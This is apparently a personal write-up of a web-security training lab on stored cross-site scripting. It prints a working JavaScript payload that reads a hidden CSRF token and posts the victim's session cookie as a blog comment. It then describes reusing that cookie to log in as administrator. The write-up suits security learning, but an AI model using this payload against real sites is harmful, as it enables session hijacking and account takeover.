# Exploiting cross-site scripting to steal cookies

## Challenge
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

The ideal solution of this lab require us to use the **Burp Collaborator** which is a paid software.\
The alternative solution I followed for this challenge is to simulate a `CSRF` attack along with `XSS` attack. This is a less subtle solution as it will print the simulated user's cookie as a blog comment which will be visible to anyone and everyone who visits the site.

### Solve
-  Like the previous challenge, the comment box is vulnerable to `XSS` attacks, as we can run raw javascript there.
- The goal is to steal the victim's session cookie (specifically the `session ID`), which is readily accessible via JavaScript using `document.cookie`.
- To post a comment on the victim's behalf, the attacker must bypass the **Cross-Site Request Forgery (CSRF) protection**. This is a hidden, randomized `csrf` token included in the comment form.
- The CSRF token value is accessed using JavaScript: `document.getElementsByName('csrf')[0].value`. This allows the attacker to obtain the token and include it in their forged request.

- The HTTP request used to post a comment is analyzed to determine all required parameters for a successful request: `csrf`, `post ID`, `comment`, `name`, `email`, and `website`.

> The final payload created to post the simulated user's session cookie.
```js
  <script>
  window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 5);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'test@test.com');
    data.append('website', 'http://www.test.com');

    fetch ('/post/comment', {
      method: 'POST',
      mode: 'no-cors',
      body: data
    });
  });
</script>
```
- After submitting the required parameters and going back to the blog, we see the `victim` user's `secret` and `session` parameters.
- Using the **Burp Suite** we open a blog on this website but pass the `victim`'s cookie instead of our own.
- We are successfully logged in as `administrator`.\
*Note: The `postId` parameter must correspond to the article number in which we are executing the attack.*


### New Learnings
- **The true purpose of Cross-Site Scripting (XSS)**: It is a powerful vector used to execute arbitrary JavaScript and access client-side data like the user's session cookie (`document.cookie`), not just to display an alert box.
 
- **How Session Hijacking works**: By stealing the victim's session cookie, an attacker can use it to impersonate the victim and gain unauthorized access to their account.
 
- **The necessity of chaining vulnerabilities**: In a protected environment, a single vulnerability (like XSS) may be insufficient. Attackers often chain multiple flaws (XSS and CSRF) to bypass security tokens and achieve their final objective.

### Resources
[Community Solution by z3nsh3ll](https://www.youtube.com/watch?v=N_87S9XVy0w&t=906s)
